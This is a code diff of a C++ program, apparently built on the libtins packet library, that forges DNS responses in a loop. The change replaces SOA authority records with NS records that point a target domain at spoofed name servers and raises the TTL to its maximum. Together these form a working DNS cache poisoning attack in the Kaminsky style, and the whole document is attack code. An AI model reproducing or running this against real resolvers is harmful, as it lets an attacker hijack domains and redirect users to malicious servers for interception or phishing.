@@ -92,7 +92,7 @@ bool send_tricky_request(std::string target_dns, std::string sarcasm, std::strin
 
 bool build_believable_responses(std::string sarcasm, std::string author_dns, std::string target_dns, std::string spoof_dns, std::string claim_domain, uint32_t port){
 	PacketSender sender;
-	uint32_t ttl_val = 9000;
+	uint32_t ttl_val = 4294967295;
 
 	for (int i = 0; i < 50; ++i)
 	{
@@ -125,11 +125,11 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 		//build authoritative record field
 
 		DNS::Resource authority_field;
-		authority_field.type(DNS::SOA);
-		authority_field.dname(basedomain);
+		authority_field.dname(sarcasm);
 		authority_field.ttl(ttl_val);
+		authority_field.type(DNS::NS);
 		authority_field.query_class(DNS::IN);
-		authority_field.data("ns1.google.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
+		authority_field.data(spoofeddns);
 
 		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
 
@@ -175,9 +175,9 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 
 		//build authoritative record field
 
-		authority_field.type(DNS::SOA);
-		authority_field.dname(basedomain);
+		authority_field.dname(sarcasm);
 		authority_field.ttl(ttl_val);
+		authority_field.type(DNS::NS);
 		authority_field.query_class(DNS::IN);
 		authority_field.data(spoofeddns2);
 
@@ -225,9 +225,9 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 
 		//build authoritative record field
 
-		authority_field.type(DNS::SOA);
-		authority_field.dname(basedomain);
+		authority_field.dname(sarcasm);
 		authority_field.ttl(ttl_val);
+		authority_field.type(DNS::NS);
 		authority_field.query_class(DNS::IN);
 		authority_field.data(spoofeddns3);
 
@@ -276,9 +276,10 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 
 		//build authoritative record field
 
-		authority_field.type(DNS::SOA);
-		authority_field.dname(basedomain);
+
+		authority_field.dname(sarcasm);
 		authority_field.ttl(ttl_val);
+		authority_field.type(DNS::NS);
 		authority_field.query_class(DNS::IN);
 		authority_field.data(spoofeddns4);
 
